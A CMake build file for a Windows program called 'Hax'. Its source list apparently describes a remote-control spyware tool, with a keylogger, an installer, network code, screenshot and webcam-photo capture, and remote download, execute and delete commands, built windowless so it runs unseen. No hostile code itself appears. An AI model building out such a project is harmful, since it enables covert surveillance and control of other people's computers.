cmake_minimum_required(VERSION 2.6)
project(Hax)

set(SRC
    src/CommandExe.cpp
    src/CommandExe.h
    src/Command.h
    src/Command_batch.cpp
    src/Command_batch.h
    src/Command_dl.cpp
    src/Command_dl.h
    src/Command_exec.cpp
    src/Command_exec.h
    src/Command_exit.cpp
    src/Command_exit.h
    src/Command_info.cpp
    src/Command_info.h
    src/Command_ls.cpp
    src/Command_ls.h
    src/Command_msgbox.cpp
    src/Command_msgbox.h
    src/Command_photo.cpp
    src/Command_photo.h
    src/Command_remove.cpp
    src/Command_remove.h
    src/Command_screenshot.cpp
    src/Command_screenshot.h
    src/ImageUtils.cpp
    src/ImageUtils.h
    src/Installer.cpp
    src/Installer.h
    src/Keylogger.cpp
    src/Keylogger.h
    src/Logger.cpp
    src/Logger.h
    src/Main.cpp
    src/Network.cpp
    src/Network.h
    src/Settings.h
    src/stdafx.cpp
    src/stdafx.h
    src/targetver.h
    src/Util.cpp
    src/Util.h
)

set(LIBS
    secur32.lib
    ws2_32.lib
)

add_executable(Hax ${SRC})
target_link_libraries(Hax ${LIBS})

add_definitions("-DUNICODE -D_UNICODE")

if(MSVC)
    set_target_properties(Hax PROPERTIES LINK_FLAGS "/SUBSYSTEM:WINDOWS")
endif()
